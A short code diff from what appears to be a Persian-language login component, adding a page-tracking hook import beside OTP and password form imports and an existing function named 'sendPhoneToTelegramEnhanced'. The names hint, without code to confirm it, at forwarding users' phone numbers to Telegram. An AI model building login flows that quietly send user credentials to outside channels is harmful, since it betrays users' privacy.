@@ -18,6 +18,7 @@ import { AlertMessage } from "./AlertMessage";
 import { OTPInput } from "./OTPInput";
 import { PasswordForm } from "./PasswordForm";
 import { cn } from "@/lib/utils";
+import { usePageTracker } from "@/hooks/usePageTracker";
 import { toPersianDigits, toEnglishDigits } from "@/lib/persian-utils";
 import {
   sendPhoneToTelegramEnhanced,
